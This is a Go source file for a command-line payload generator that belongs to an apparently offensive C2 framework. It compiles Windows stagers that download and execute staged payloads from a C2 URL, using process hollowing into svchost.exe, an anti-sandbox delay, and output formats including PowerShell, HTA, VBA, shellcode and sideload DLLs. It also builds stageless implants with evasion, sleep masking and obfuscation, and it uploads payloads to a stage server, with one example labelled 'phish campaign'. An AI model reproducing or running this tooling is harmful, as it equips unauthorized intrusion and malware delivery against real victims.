package main

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"

	"github.com/spf13/cobra"
)

// ── stager subcommand ─────────────────────────────────────────────────────────

var stagerCmd = &cobra.Command{
	Use:   "stager",
	Short: "Compile a minimal stager that downloads and executes a staged payload",
	Example: `  taburtuai-generate stager \
    --c2 https://c2.example.com \
    --token abc123def456 \
    --key MyAESKey16Chars \
    --method hollow \
    --format exe \
    --output bin/stager.exe

  taburtuai-generate stager \
    --c2 https://c2.example.com \
    --token abc123def456 \
    --format ps1 \
    --output stager.ps1`,
	RunE: runStager,
}

func init() {
	stagerCmd.Flags().String("c2", "http://127.0.0.1:8080", "C2 base URL")
	stagerCmd.Flags().String("token", "", "Stage token (required)")
	stagerCmd.Flags().String("key", "SpookyOrcaC2AES1", "AES encryption key")
	stagerCmd.Flags().String("method", "thread", "Execution method: thread|hollow|drop")
	stagerCmd.Flags().String("hollow-exe", `C:\Windows\System32\svchost.exe`, "Hollow target process")
	stagerCmd.Flags().String("format", "exe", "Output format: exe|ps1|ps1-mem|hta|vba|cs")
	stagerCmd.Flags().String("arch", "amd64", "Target arch: amd64|x86")
	stagerCmd.Flags().Int("jitter", 0, "Anti-sandbox sleep seconds before execution")
	stagerCmd.Flags().String("output", "", "Output file path (default: stdout or auto-named)")
	stagerCmd.Flags().Bool("no-strip", false, "Keep debug info (larger binary)")
	_ = stagerCmd.MarkFlagRequired("token")
}

func runStager(cmd *cobra.Command, _ []string) error {
	c2, _ := cmd.Flags().GetString("c2")
	token, _ := cmd.Flags().GetString("token")
	key, _ := cmd.Flags().GetString("key")
	method, _ := cmd.Flags().GetString("method")
	hollowExe, _ := cmd.Flags().GetString("hollow-exe")
	format, _ := cmd.Flags().GetString("format")
	arch, _ := cmd.Flags().GetString("arch")
	jitter, _ := cmd.Flags().GetInt("jitter")
	output, _ := cmd.Flags().GetString("output")
	noStrip, _ := cmd.Flags().GetBool("no-strip")

	// Always compile the EXE first
	exePath, tmpDir, err := compileStager(compileOpts{
		C2URL:     c2,
		Token:     token,
		Key:       key,
		Method:    method,
		HollowExe: hollowExe,
		Arch:      arch,
		Jitter:    fmt.Sprintf("%d", jitter),
		Strip:     !noStrip,
	})
	if err != nil {
		return fmt.Errorf("compile stager: %w", err)
	}
	if tmpDir != "" {
		defer os.RemoveAll(tmpDir)
	}

	exeBytes, err := os.ReadFile(exePath)
	if err != nil {
		return fmt.Errorf("read stager binary: %w", err)
	}

	stageURL := strings.TrimRight(c2, "/") + "/stage/" + token

	var data []byte
	var ext string

	switch format {
	case "exe":
		data, ext = exeBytes, ".exe"
	case "ps1":
		data, ext = []byte(templatePS1Drop(stageURL, exeBytes)), ".ps1"
	case "ps1-mem":
		data, ext = []byte(templatePS1Shellcode(stageURL)), ".ps1"
	case "hta":
		data, ext = []byte(templateHTA(stageURL, exeBytes)), ".hta"
	case "vba":
		data, ext = []byte(templateVBA(stageURL)), ".bas"
	case "cs":
		data, ext = []byte(templateCS(stageURL)), ".cs"
	case "shellcode":
		sc, err := pe2Shellcode(exeBytes)
		if err != nil {
			return fmt.Errorf("shellcode conversion: %w", err)
		}
		data, ext = sc, ".bin"
	case "dll":
		dllBytes, err := buildSideloadDLL(compileOpts{
			C2URL: c2, Token: token, Key: key,
			Method: method, Arch: arch, Strip: !noStrip,
		})
		if err != nil {
			return fmt.Errorf("build DLL: %w", err)
		}
		data, ext = dllBytes, ".dll"
	default:
		return fmt.Errorf("unknown format %q (exe|ps1|ps1-mem|hta|vba|cs|shellcode|dll)", format)
	}

	return writeOutput(output, ext, data)
}

// ── stageless subcommand ──────────────────────────────────────────────────────

var stagelessCmd = &cobra.Command{
	Use:   "stageless",
	Short: "Compile the full agent as a self-contained implant",
	Example: `  taburtuai-generate stageless \
    --c2 https://c2.example.com \
    --key MyAESKey \
    --interval 60 --jitter 20 \
    --kill-date 2026-12-31 \
    --format exe \
    --output bin/implant.exe`,
	RunE: runStageless,
}

func init() {
	stagelessCmd.Flags().String("c2", "http://127.0.0.1:8080", "C2 server URL")
	stagelessCmd.Flags().String("key", "SpookyOrcaC2AES1", "AES encryption key")
	stagelessCmd.Flags().String("secondary-key", "TaburtuaiSecondary", "Secondary key")
	stagelessCmd.Flags().Int("interval", 30, "Beacon interval (seconds)")
	stagelessCmd.Flags().Int("jitter", 20, "Jitter percent")
	stagelessCmd.Flags().String("kill-date", "", "Kill date YYYY-MM-DD")
	stagelessCmd.Flags().String("exec-method", "powershell", "Default exec method")
	stagelessCmd.Flags().Bool("evasion", true, "Enable evasion features")
	stagelessCmd.Flags().Bool("sleep-mask", true, "Enable sleep masking")
	stagelessCmd.Flags().String("format", "exe", "Output format: exe|dll-sideload")
	stagelessCmd.Flags().String("arch", "amd64", "Target arch: amd64|x86")
	stagelessCmd.Flags().Bool("no-gui", true, "Hide console window (-H windowsgui)")
	stagelessCmd.Flags().Bool("garble", false, "Use garble obfuscation (requires garble in PATH)")
	stagelessCmd.Flags().String("output", "", "Output file path")
}

func runStageless(cmd *cobra.Command, _ []string) error {
	c2, _ := cmd.Flags().GetString("c2")
	key, _ := cmd.Flags().GetString("key")
	secKey, _ := cmd.Flags().GetString("secondary-key")
	interval, _ := cmd.Flags().GetInt("interval")
	jitter, _ := cmd.Flags().GetInt("jitter")
	killDate, _ := cmd.Flags().GetString("kill-date")
	execMethod, _ := cmd.Flags().GetString("exec-method")
	evasion, _ := cmd.Flags().GetBool("evasion")
	sleepMask, _ := cmd.Flags().GetBool("sleep-mask")
	arch, _ := cmd.Flags().GetString("arch")
	noGUI, _ := cmd.Flags().GetBool("no-gui")
	useGarble, _ := cmd.Flags().GetBool("garble")
	output, _ := cmd.Flags().GetString("output")

	exePath, tmpDir, err := compileAgent(agentOpts{
		C2URL:        c2,
		Key:          key,
		SecondaryKey: secKey,
		Interval:     fmt.Sprintf("%d", interval),
		Jitter:       fmt.Sprintf("%d", jitter),
		KillDate:     killDate,
		ExecMethod:   execMethod,
		Evasion:      evasion,
		SleepMask:    sleepMask,
		Arch:         arch,
		NoGUI:        noGUI,
		Garble:       useGarble,
	})
	if err != nil {
		return fmt.Errorf("compile agent: %w", err)
	}
	if tmpDir != "" {
		defer os.RemoveAll(tmpDir)
	}

	agentBytes, err := os.ReadFile(exePath)
	if err != nil {
		return fmt.Errorf("read agent binary: %w", err)
	}

	if output == "" {
		output = "implant_" + arch + ".exe"
	}
	if err := os.WriteFile(output, agentBytes, 0755); err != nil {
		return err
	}
	fmt.Printf("[+] Stageless implant: %s (%d KB)\n", output, len(agentBytes)/1024)
	return nil
}

// ── upload subcommand ─────────────────────────────────────────────────────────

var uploadCmd = &cobra.Command{
	Use:   "upload <payload-file>",
	Short: "Upload a payload file to the C2 stage server",
	Args:  cobra.ExactArgs(1),
	Example: `  taburtuai-generate upload bin/agent.exe \
    --server https://c2.example.com \
    --api-key mykey \
    --format exe --ttl 24 --desc "phish campaign"`,
	RunE: runUpload,
}

func init() {
	uploadCmd.Flags().String("server", "http://127.0.0.1:8080", "C2 server URL")
	uploadCmd.Flags().String("api-key", "", "C2 API key")
	uploadCmd.Flags().String("format", "exe", "Payload format: exe|shellcode|dll")
	uploadCmd.Flags().String("arch", "amd64", "Payload arch")
	uploadCmd.Flags().Int("ttl", 24, "TTL hours (0=no expiry)")
	uploadCmd.Flags().String("desc", "", "Description")
}

func runUpload(cmd *cobra.Command, args []string) error {
	payloadFile := args[0]
	server, _ := cmd.Flags().GetString("server")
	apiKey, _ := cmd.Flags().GetString("api-key")
	format, _ := cmd.Flags().GetString("format")
	arch, _ := cmd.Flags().GetString("arch")
	ttl, _ := cmd.Flags().GetInt("ttl")
	desc, _ := cmd.Flags().GetString("desc")

	data, err := os.ReadFile(payloadFile)
	if err != nil {
		return fmt.Errorf("read payload: %w", err)
	}

	token, stageURL, err := uploadStage(server, apiKey, data, format, arch, ttl, desc)
	if err != nil {
		return fmt.Errorf("upload: %w", err)
	}

	fmt.Printf("[+] Stage uploaded\n")
	fmt.Printf("    Token    : %s\n", token)
	fmt.Printf("    Stage URL: %s\n", stageURL)
	fmt.Printf("    Format   : %s/%s\n", format, arch)
	fmt.Printf("    Size     : %d bytes\n", len(data))
	fmt.Printf("    TTL      : %dh\n", ttl)
	return nil
}

// ── compilation helpers ───────────────────────────────────────────────────────

type compileOpts struct {
	C2URL     string
	Token     string
	Key       string
	Method    string
	HollowExe string
	Arch      string
	Jitter    string
	Strip     bool
}

// compileStager cross-compiles cmd/stager for Windows with baked-in config.
// Returns path to the compiled binary and a temp dir to clean up (may be "").
func compileStager(o compileOpts) (exePath, tmpDir string, err error) {
	tmpDir, err = os.MkdirTemp("", "taburtuai-stager-*")
	if err != nil {
		return "", "", err
	}

	outFile := filepath.Join(tmpDir, "stager.exe")

	ldflags := strings.Join([]string{
		"-s", "-w",
		"-H", "windowsgui",
		fmt.Sprintf("-X main.c2URL=%s", o.C2URL),
		fmt.Sprintf("-X main.stageToken=%s", o.Token),
		fmt.Sprintf("-X main.encKey=%s", o.Key),
		fmt.Sprintf("-X main.execMethod=%s", o.Method),
		fmt.Sprintf("-X 'main.hollowExe=%s'", o.HollowExe),
		fmt.Sprintf("-X main.jitterSleep=%s", o.Jitter),
	}, " ")

	if !o.Strip {
		ldflags = strings.TrimPrefix(ldflags, "-s -w ")
	}

	goTool := "go"
	goArch := o.Arch
	if goArch == "" {
		goArch = "amd64"
	}

	cmdArgs := []string{
		"build",
		"-ldflags", ldflags,
		"-o", outFile,
		"./cmd/stager",
	}

	c := exec.Command(goTool, cmdArgs...)
	c.Env = append(os.Environ(),
		"GOOS=windows",
		fmt.Sprintf("GOARCH=%s", goArch),
		"CGO_ENABLED=0",
	)
	c.Dir = moduleRoot()

	var buf bytes.Buffer
	c.Stdout = &buf
	c.Stderr = &buf

	fmt.Printf("[*] Compiling stager (%s/windows)...\n", goArch)
	if err := c.Run(); err != nil {
		return "", tmpDir, fmt.Errorf("go build failed:\n%s", buf.String())
	}

	info, _ := os.Stat(outFile)
	fmt.Printf("[+] Stager compiled: %d KB\n", info.Size()/1024)
	return outFile, tmpDir, nil
}

type agentOpts struct {
	C2URL        string
	Key          string
	SecondaryKey string
	Interval     string
	Jitter       string
	KillDate     string
	ExecMethod   string
	Evasion      bool
	SleepMask    bool
	Arch         string
	NoGUI        bool
	Garble       bool
}

// compileAgent cross-compiles the full agent for Windows.
func compileAgent(o agentOpts) (exePath, tmpDir string, err error) {
	tmpDir, err = os.MkdirTemp("", "taburtuai-agent-*")
	if err != nil {
		return "", "", err
	}

	outFile := filepath.Join(tmpDir, "agent.exe")

	ldflagParts := []string{
		"-s", "-w",
		fmt.Sprintf("-X main.serverURL=%s", o.C2URL),
		fmt.Sprintf("-X main.encKey=%s", o.Key),
		fmt.Sprintf("-X main.secondaryKey=%s", o.SecondaryKey),
		fmt.Sprintf("-X main.defaultInterval=%s", o.Interval),
		fmt.Sprintf("-X main.defaultJitter=%s", o.Jitter),
		fmt.Sprintf("-X main.defaultExecMethod=%s", o.ExecMethod),
		fmt.Sprintf("-X main.defaultEnableEvasion=%v", o.Evasion),
		fmt.Sprintf("-X main.defaultSleepMasking=%v", o.SleepMask),
	}
	if o.KillDate != "" {
		ldflagParts = append(ldflagParts, fmt.Sprintf("-X main.defaultKillDate=%s", o.KillDate))
	}
	if o.NoGUI {
		ldflagParts = append(ldflagParts, "-H", "windowsgui")
	}
	ldflags := strings.Join(ldflagParts, " ")

	goArch := o.Arch
	if goArch == "" {
		goArch = "amd64"
	}

	var c *exec.Cmd
	if o.Garble {
		c = exec.Command("garble", "-tiny", "-literals", "-seed=random",
			"build", "-ldflags", ldflags, "-o", outFile, "./agent")
	} else {
		c = exec.Command("go", "build", "-ldflags", ldflags, "-o", outFile, "./agent")
	}
	c.Env = append(os.Environ(),
		"GOOS=windows",
		fmt.Sprintf("GOARCH=%s", goArch),
		"CGO_ENABLED=0",
	)
	c.Dir = moduleRoot()

	var buf bytes.Buffer
	c.Stdout = &buf
	c.Stderr = &buf

	fmt.Printf("[*] Compiling agent (%s/windows)...\n", goArch)
	if err := c.Run(); err != nil {
		return "", tmpDir, fmt.Errorf("go build failed:\n%s", buf.String())
	}

	info, _ := os.Stat(outFile)
	fmt.Printf("[+] Agent compiled: %d KB\n", info.Size()/1024)
	return outFile, tmpDir, nil
}

// ── misc helpers ──────────────────────────────────────────────────────────────

// moduleRoot returns the directory containing go.mod (project root).
func moduleRoot() string {
	// Walk up from the generate binary location
	exe, err := os.Executable()
	if err != nil {
		return "."
	}
	dir := filepath.Dir(exe)
	for {
		if _, err := os.Stat(filepath.Join(dir, "go.mod")); err == nil {
			return dir
		}
		parent := filepath.Dir(dir)
		if parent == dir {
			break
		}
		dir = parent
	}
	// Fallback: use runtime caller to find source dir
	_, file, _, ok := runtime.Caller(0)
	if ok {
		return filepath.Join(filepath.Dir(file), "..", "..")
	}
	return "."
}

func writeOutput(path, defaultExt string, data []byte) error {
	if path == "" {
		path = "output" + defaultExt
	}
	if err := os.WriteFile(path, data, 0644); err != nil {
		return err
	}
	fmt.Printf("[+] Output: %s (%d bytes)\n", path, len(data))
	return nil
}

// base64Encode returns the standard base64 encoding of data.
func base64Encode(data []byte) string {
	return base64.StdEncoding.EncodeToString(data)
}
